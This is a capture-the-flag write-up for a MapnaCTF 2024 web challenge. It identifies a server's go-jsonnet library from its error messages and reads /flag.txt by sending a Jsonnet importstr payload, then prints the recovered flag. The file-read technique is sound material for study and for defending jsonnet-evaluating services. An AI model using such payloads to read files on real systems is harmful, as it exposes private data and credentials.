---
title: "Advanced JSON Cutifier"
description: "My homework was to write a JSON beautifier. Just Indenting JSON files was too boring that's why I decided to add some features to my project using a popular (More than 1k stars on GitHub!! ) library to make my project more exciting. Important: You can't read any file other than /flag.txt on the remote environment."
pubDate: 2024-01-22
ctf: "MapnaCTF 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-mapnactf/icon.png"
---

Looking at the source code provided first we can see a redacted Go library from github.

```go
import (
    "net/http"
    "github.com/gin-gonic/gin"
    "github.com/REDACTED/REDACTED"
)
```

I cause some errors on the server to try and identify the library:
```
Expected token OPERATOR but got "}"
Expected a comma before next field
```

Both these errors point towards the [go-jsonnet](https://github.com/google/go-jsonnet) library, which meets the stars requirement in the challenge description.

I end up looking for ways to read files in the issues section of the repo and find [this issue](https://github.com/google/go-jsonnet/issues/337).

It mentions a payload like the following:

```json
{
    "wow so advanced!!": importstr "/flag.txt”
}
```

Running it in the parser we are given the flag:

```json
{
   "wow so advanced!!": "MAPNA{5uch-4-u53ful-f347ur3-a23f98d}\n\n"
}
```

Flag: `MAPNA{5uch-4-u53ful-f347ur3-a23f98d}`

**Files:** [player_a466f9f2a43ac42473015d72342c262e8d4b9519.txz](https://web.archive.org/web/20240121175642/https://mapnactf.com/tasks/player_a466f9f2a43ac42473015d72342c262e8d4b9519.txz)
